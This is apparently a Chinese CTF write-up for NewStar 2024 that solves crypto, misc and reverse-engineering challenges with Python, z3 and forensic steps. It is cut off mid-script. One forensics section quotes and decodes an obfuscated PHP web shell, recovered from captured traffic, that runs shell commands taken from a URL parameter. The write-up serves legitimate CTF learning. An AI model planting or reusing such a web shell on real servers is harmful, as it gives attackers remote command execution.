<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">φ=124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102547272582607556946597809819206498583700587629821896578436377540232328729792993693280980361351684844458558344121591584147825245121367422062684374122308816800</span><br><span class="line">d=22611589977370520102188494132173206662182894540575368174403027280708176548743712414509190973164201319228760596652928358557224295975095230681067496021808078343144195007103821354677774261541360191905462400209949218721814339047952228144496950320622160175823856053884916779719061830624839737774087658005009858273</span><br><span class="line">m=264482712154170621062930777958510103708372984838245841047957012723716220867587500009954604988711976936661501831365621134205</span><br></pre></td></tr></table></figure>
<p>解得<font color=deepskyblue><strong>flag{yihuo_yuan_lai_xian_ji_suan_liang_bian_de2333}</strong></font>.</p>
<h3 id="Since-you-konw-something："><a href="#Since-you-konw-something：" class="headerlink" title="Since you konw something："></a>Since you konw something：</h3><p>发现仍然是异或，但是这次key不知道，不过提示了非常小，于是按上次的方式遍历key，最后得到key是b’ns’，flag为：<font color=deepskyblue><strong>flag{Y0u_kn0w_th3_X0r_b3tt3r}</strong></font>.代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span class="number">218950457292639210021937048771508243745941011391746420225459726647571</span></span><br><span class="line">c_bytes = long_to_bytes(c)</span><br><span class="line">prefix = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key_len <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * key_len)):</span><br><span class="line">    key_bytes = key.to_bytes(key_len, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    flag = xor(c_bytes, key_bytes)</span><br><span class="line">    <span class="keyword">if</span> flag.startswith(prefix[:<span class="built_in">len</span>(flag)]):</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key_bytes&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="茶里茶气："><a href="#茶里茶气：" class="headerlink" title="茶里茶气："></a>茶里茶气：</h3><p>观察代码并结合题目名称得知该算法是魔改的TEA加密，flag长度为25（内部为19），a是将 flag 中每个字符的 ASCII 值转换为十六进制字符串，去掉0x并连接起来形成一个长的字符串，当flag长度为25时l的值恰为199，v0是a 的前 99 位，v1是a的后99位，接下来随机了一个<code>p=446302455051275584229157195942211</code>，又给出了其他几个数据：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">0</span></span><br><span class="line">derta = <span class="number">462861781278454071588539315363</span></span><br><span class="line">v3 = <span class="number">489552116384728571199414424951</span></span><br><span class="line">v4 = <span class="number">469728069391226765421086670817</span></span><br><span class="line">v5 = <span class="number">564098252372959621721124077407</span></span><br><span class="line">v6 = <span class="number">335640247620454039831329381071</span></span><br></pre></td></tr></table></figure>
<p>之后进行32次变换：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v1 += (v0+v2) ^ ( <span class="number">8</span>*v0 + v3 ) ^ ( (v0&gt;&gt;<span class="number">7</span>) + v4 ) ; v1 %= p</span><br><span class="line">    v0 += (v1+v2) ^ ( <span class="number">8</span>*v1 + v5 ) ^ ( (v1&gt;&gt;<span class="number">7</span>) + v6 ) ; v0 %= p</span><br><span class="line">    v2 += derta ; v2 %= p</span><br></pre></td></tr></table></figure>
<p>变换又可以写作：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v1 = (v1 + ((v0+v2) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">  v0 = (v0 + ((v1+v2) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br><span class="line">  v2 = (v2 + derta) % p</span><br></pre></td></tr></table></figure>
<p>注意到v2初始值是0，且derta远小于p（p&#x2F;derta≈964），所以v2在每次执行完后其实是(i+1)*derta，从来没有被取过余，代入可转化为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v1 = (v1 + ((v0 + i * derta) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">  v0 = (v0 + ((v1 + i * derta) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br></pre></td></tr></table></figure>
<p>而v0和v1是一定会超出p的，所以被取过余。又∵若a+b ≡ c (mod p)，则a ≡ c - b (mod p)，构建逆向算法：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">l = <span class="number">199</span></span><br><span class="line">v0 = <span class="number">190997821330413928409069858571234</span></span><br><span class="line">v1 = <span class="number">137340509740671759939138452113480</span></span><br><span class="line">p = <span class="number">446302455051275584229157195942211</span></span><br><span class="line">derta = <span class="number">462861781278454071588539315363</span></span><br><span class="line">v3 = <span class="number">489552116384728571199414424951</span></span><br><span class="line">v4 = <span class="number">469728069391226765421086670817</span></span><br><span class="line">v5 = <span class="number">564098252372959621721124077407</span></span><br><span class="line">v6 = <span class="number">335640247620454039831329381071</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    v0 = (v0 - ((v1+i*derta) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br><span class="line">    v1 = (v1 - ((v0+i*derta) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">a_long = (v0 &lt;&lt; (l // <span class="number">2</span>)) + v1</span><br><span class="line">flag = long_to_bytes(a_long).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>解得flag为：<font color=deepskyblue><strong>flag{f14gg9_te2_1i_7ea_7}</strong></font>.</p>
<h3 id="Just-one-and-more-than-two："><a href="#Just-one-and-more-than-two：" class="headerlink" title="Just one and more than two："></a>Just one and more than two：</h3><p>观察发现是变种的RSA，N为3个大质数的成绩，flag被拆成大小相等的两段，m1和m2所取的mod也不一样，但依旧可以按照之前的方法来解：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span></span><br><span class="line">q = <span class="number">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span></span><br><span class="line">r = <span class="number">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span></span><br><span class="line">c1 = <span class="number">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span></span><br><span class="line">c2 = <span class="number">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span></span><br><span class="line">N = p*q*r</span><br><span class="line">phiN = (p-<span class="number">1</span>) * (q-<span class="number">1</span>) * (r-<span class="number">1</span>)</span><br><span class="line">d1 = mod_inverse(e, p-<span class="number">1</span>)</span><br><span class="line">d2 = mod_inverse(e, phiN)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, N)</span><br><span class="line">m1_b = long_to_bytes(m1)</span><br><span class="line">m2_b = long_to_bytes(m2)</span><br><span class="line">flag1 = m1_b.decode()</span><br><span class="line">flag2 = m2_b.decode()</span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br></pre></td></tr></table></figure>
<p>拼合得到flag：<font color=deepskyblue><strong>flag{Y0u_re4lly_kn0w_Euler_4nd_N3xt_Eu1er_is_Y0u!}</strong></font>.</p>
<h2 id="Misc方向：-1"><a href="#Misc方向：-1" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="wireshark-checkin："><a href="#wireshark-checkin：" class="headerlink" title="wireshark_checkin："></a>wireshark_checkin：</h3><p>打开pcapng，根据题目flag应该在文件传输中留有痕迹，在左上角导出对象HTTP中发现有一个flag.txt，找到flag：<font color=deepskyblue><strong>flag{ez_traffic_analyze_isn’t_it}</strong></font>.</p>
<h3 id="wireshark-secret："><a href="#wireshark-secret：" class="headerlink" title="wireshark_secret："></a>wireshark_secret：</h3><p>依旧是导出对象，发现有一张png，导出后在图片上得到flag：<font color=deepskyblue><strong>flag{you_are_gooddddd}</strong></font>.</p>
<h3 id="热心助人的小明同学："><a href="#热心助人的小明同学：" class="headerlink" title="热心助人的小明同学："></a>热心助人的小明同学：</h3><p>根据提示文件是一个内存镜像，下载文件后将格式改为.vmem，用Passware Password Recovery Kit破解得到密码为：<code>ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh</code>，即为flag.</p>
<h3 id="用溯流仪见证伏特台风："><a href="#用溯流仪见证伏特台风：" class="headerlink" title="用溯流仪见证伏特台风："></a>用溯流仪见证伏特台风：</h3><p>搜索相关报导，在<code>http://news.china.com.cn/2024-07/08/content_117297304.shtml</code><br>找到原图清晰版本得到域名为：powerj7kmpzkdhjg4szvcxxgktgk36ezpjxvtosylrpey7svpmrjyuyd.onion，转写16位小写md5得到<code>6c3ea51b6f9d4f5e</code>，即为flag.</p>
<h3 id="你也玩原神吗："><a href="#你也玩原神吗：" class="headerlink" title="你也玩原神吗："></a>你也玩原神吗：</h3><p>发现gif中包含一帧特殊图像：<br><img src="/pictures/ns24_ys.png" title="genshin"><br>拆解发现其中正中央是经典的乱数假文：<br><code>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</code> 但是末尾出现了四个额外字符quis，左上角是flag is a sentence，左下角是do you know fence，考虑栅栏加密，右上角是<code>iiaaelgtsfkfa</code>，解密得到<code>itisafakeflag</code>，右下角是<code>mesioaabgnhnsggogmyeiade</code>，解密得到<code>maybegenshinisagogdoagem</code>，转换一下得到<code>maybegenshinisagoodgame</code>，即为flag.</p>
<h3 id="字里行间的秘密："><a href="#字里行间的秘密：" class="headerlink" title="字里行间的秘密："></a>字里行间的秘密：</h3><p>打开txt发现藏的有两部分零宽度隐写，破解得到隐写字符分别为<font color=red><strong>i</strong></font>和<font color=red><strong>t_is_k3y</strong></font>，合并得到<font color=red><strong>it_is_k3y</strong></font>，打开docx文档，发现有一行虚空文字，复制粘贴得到flag：<font color=deepskyblue><strong>flag{you_h4ve_4nyth1n9}</strong></font>.</p>
<h3 id="Herta’s-Study："><a href="#Herta’s-Study：" class="headerlink" title="Herta’s Study："></a>Herta’s Study：</h3><p>追踪流，发现上传了一个木马，还有<font color=red><strong>fake{this_is_fake_falg}</strong></font>和名为<code>flag</code>、<code>fla</code>、<code>f</code>的txt记录，导出全部对象后发现以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------350282821911984478142300364923</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;horse.php&quot;</span><br><span class="line">Content-Type: application/x-php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(</span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;J&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;T&#x27;</span>).<span class="string">&#x27;5z&#x27;</span>),   </span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span></span><br><span class="line"><span class="string">        Kz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQo</span></span><br><span class="line"><span class="string">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>)   </span><br><span class="line">    );  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------350282821911984478142300364923</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line">提交</span><br><span class="line">-----------------------------350282821911984478142300364923--</span><br><span class="line">文件 horse.php 已被成功上传。&lt;br&gt;文件类型: application/x-php&lt;br&gt;文件大小: 0.435546875 kB&lt;br&gt;文件存储的位置: D:/phpstudy_pro/WWW/ezupload/upload/horse.php</span><br></pre></td></tr></table></figure>
<p>解码中间的构建函数部分后得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(<span class="variable">$ns</span>,   </span><br><span class="line">        <span class="variable">$ns</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ns</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$ns</span>);<span class="variable">$i</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(<span class="variable">$i</span>%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        		<span class="variable">$ns</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$ns</span>[<span class="variable">$i</span>]);</span><br><span class="line">   		 &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ns</span>; </span><br><span class="line">);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得知</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得知所有输入值的偶数位都经过了rot13变换，而f、flag等文档中都含有类似base64加密的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f					        ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==</span><br><span class="line">flag				    	ZzFeZKt0aTlmX2lmX2Zua2VsZzFfZ30tCt==</span><br><span class="line">fake&#123;this_is_fake_falg&#125;	    ZzFeZKt0aTlmX2lmX2Zua2VsZzFfZ30X</span><br><span class="line">whoami				        d2hiYJ1cOjo=</span><br><span class="line">abcd			    	 	YJJwZNo=</span><br><span class="line">0721				    	MQclMDo=</span><br></pre></td></tr></table></figure>
<p>代入<code>0721</code>对应的值进行检验，变换<code>为MDcyMQo=</code>，恰好是<code>0721</code>的base64，验证完成，对上述f、flag、fake进行变换，得到其中一组为：<code>ZmxhZ3tzSDNfaTRfUzBfNmVBdXQxZnVMLn0gCg==</code>，经过转换得到<font color=deepskyblue><strong>flag{sH3_i4_S0_6eAut1fuL.}</strong></font>.</p>
<h1 id="赛题轮次：Week3"><a href="#赛题轮次：Week3" class="headerlink" title="赛题轮次：Week3"></a>赛题轮次：Week3</h1><h2 id="已解出的题目：-2"><a href="#已解出的题目：-2" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Reverse</td>
<td align="center">PangBai过家家（3）、SMc_Math、取啥名好呢？、011vm、flowering_shrubs</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">故事新编1、没e这能玩？、故事新编2</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">BGM坏了吗？、ez_jail、AmazingGame、OSINT-MASTER</td>
</tr>
</tbody></table>
<h2 id="Reverse方向：-2"><a href="#Reverse方向：-2" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="PangBai过家家（3）："><a href="#PangBai过家家（3）：" class="headerlink" title="PangBai过家家（3）："></a>PangBai过家家（3）：</h3><p>下载程序发现是被打包成exe的pyc文件，使用<code>pyinstxtractor</code>进行拆解，得到很多文件，再用<code>pycdc</code>进行反编译，反编译主pyc得到<font color=lime><strong>enc &#x3D; [40,9,22,52,15,56,66,71,111,121,90,33,18,40,3,13,80,28,65,68,83,88,34,86,5,12,35,82,67,3,17,79]</strong></font>和<font color=red><strong>key &#x3D; ‘NewStar2024’</strong></font>，一眼看出前面的数组是加密后的flag，接下来寻找是如何加密的，用pycdas再次反汇编发现是将输入值与key进行循环异或，于是再次异或得到<font color=deepskyblue><strong>flag{Y0u_Know_Py1nstall3r_W311!}</strong></font>.</p>
<h3 id="SMc-math："><a href="#SMc-math：" class="headerlink" title="SMc_math："></a>SMc_math：</h3><p>反编译主函数发现flag长度应当为28，但是最关键的encrypt函数却无法反编译，查询得知使用了动态代码加密技术，将encrypt逐字节用0x3Eu进行了异或操作，进行动态调试，在数据异或后、函数执行前下断点，再在汇编界面选中整个函数按u转回机器码，再按p汇编，按f5反编译，得到以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = a1[<span class="number">2</span>];</span><br><span class="line">  v5 = a1[<span class="number">3</span>];</span><br><span class="line">  v6 = a1[<span class="number">4</span>];</span><br><span class="line">  v7 = a1[<span class="number">5</span>];</span><br><span class="line">  v8 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">5</span> * (v3 + v2) + <span class="number">4</span> * v4 + <span class="number">6</span> * v5 + v6 + <span class="number">9</span> * v8 + <span class="number">2</span> * v7 == <span class="number">0xD5CC7D4FFL</span>L</span><br><span class="line">      &amp;&amp; <span class="number">4</span> * v8 + <span class="number">3</span> * v5 + <span class="number">6</span> * v4 + <span class="number">10</span> * v3 + <span class="number">9</span> * v2 + <span class="number">9</span> * v7 + <span class="number">3</span> * v6 == <span class="number">0x102335844BL</span>L</span><br><span class="line">      &amp;&amp; <span class="number">9</span> * v6 + <span class="number">4</span> * (v5 + v4) + <span class="number">5</span> * v3 + <span class="number">4</span> * v2 + <span class="number">3</span> * v8 + <span class="number">10</span> * v7 == <span class="number">0xD55AEABB9L</span>L</span><br><span class="line">      &amp;&amp; <span class="number">9</span> * v3 + <span class="number">5</span> * v2 + <span class="number">9</span> * v8 + <span class="number">2</span> * (v4 + <span class="number">2</span> * v5 + <span class="number">5</span> * v6 + v7) == <span class="number">0xF89F6B7FAL</span>L</span><br><span class="line">      &amp;&amp; <span class="number">5</span> * v6 + <span class="number">9</span> * v5 + <span class="number">7</span> * v2 + <span class="number">2</span> * v3 + v4 + <span class="number">3</span> * v8 + <span class="number">9</span> * v7 == <span class="number">0xD5230B80BL</span>L</span><br><span class="line">      &amp;&amp; <span class="number">8</span> * v8 + <span class="number">6</span> * v5 + <span class="number">10</span> * v4 + <span class="number">5</span> * v3 + <span class="number">6</span> * v2 + <span class="number">3</span> * v7 + <span class="number">9</span> * v6 == <span class="number">0x11E28ED873L</span>L</span><br><span class="line">      &amp;&amp; v2 + <span class="number">4</span> * (v4 + v3 + <span class="number">2</span> * v5) + <span class="number">9</span> * v6 + v7 + <span class="number">3</span> * v8 == <span class="number">0xB353C03E1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察encrypt函数不难猜出v4~v10是输入值按小端序转为dword的结果，而且输入的a1是32位无符号整数（如输入1234则为0x34333231u），然后构建了一大堆式子使得输入值经过某些变化满足所给常数才能通过：<br><img src="/pictures/ns24_smc.png"><br>编写python z3-solver脚本来解出flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">chars = [BitVec(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chars_to_uint32</span>(<span class="params">chars</span>):</span><br><span class="line">  <span class="keyword">return</span> Concat(chars[<span class="number">3</span>], chars[<span class="number">2</span>], chars[<span class="number">1</span>], chars[<span class="number">0</span>])</span><br><span class="line">v2 = chars_to_uint32(chars[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">v3 = chars_to_uint32(chars[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">v4 = chars_to_uint32(chars[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">v5 = chars_to_uint32(chars[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">v6 = chars_to_uint32(chars[<span class="number">16</span>:<span class="number">20</span>])</span><br><span class="line">v7 = chars_to_uint32(chars[<span class="number">20</span>:<span class="number">24</span>])</span><br><span class="line">v8 = chars_to_uint32(chars[<span class="number">24</span>:<span class="number">28</span>])</span><br><span class="line">constraints = [</span><br><span class="line">  <span class="number">5</span> * (v3 + v2) + <span class="number">4</span> * v4 + <span class="number">6</span> * v5 + v6 + <span class="number">9</span> * v8 + <span class="number">2</span> * v7 == <span class="number">0xD5CC7D4FF</span>,</span><br><span class="line">  <span class="number">4</span> * v8 + <span class="number">3</span> * v5 + <span class="number">6</span> * v4 + <span class="number">10</span> * v3 + <span class="number">9</span> * v2 + <span class="number">9</span> * v7 + <span class="number">3</span> * v6 == <span class="number">0x102335844B</span>,</span><br><span class="line">  <span class="number">9</span> * v6 + <span class="number">4</span> * (v5 + v4) + <span class="number">5</span> * v3 + <span class="number">4</span> * v2 + <span class="number">3</span> * v8 + <span class="number">10</span> * v7 == <span class="number">0xD55AEABB9</span>,</span><br><span class="line">  <span class="number">9</span> * v3 + <span class="number">5</span> * v2 + <span class="number">9</span> * v8 + <span class="number">2</span> * (v4 + <span class="number">2</span> * v5 + <span class="number">5</span> * v6 + v7) == <span class="number">0xF89F6B7FA</span>,</span><br><span class="line">  <span class="number">5</span> * v6 + <span class="number">9</span> * v5 + <span class="number">7</span> * v2 + <span class="number">2</span> * v3 + v4 + <span class="number">3</span> * v8 + <span class="number">9</span> * v7 == <span class="number">0xD5230B80B</span>,</span><br><span class="line">  <span class="number">8</span> * v8 + <span class="number">6</span> * v5 + <span class="number">10</span> * v4 + <span class="number">5</span> * v3 + <span class="number">6</span> * v2 + <span class="number">3</span> * v7 + <span class="number">9</span> * v6 == <span 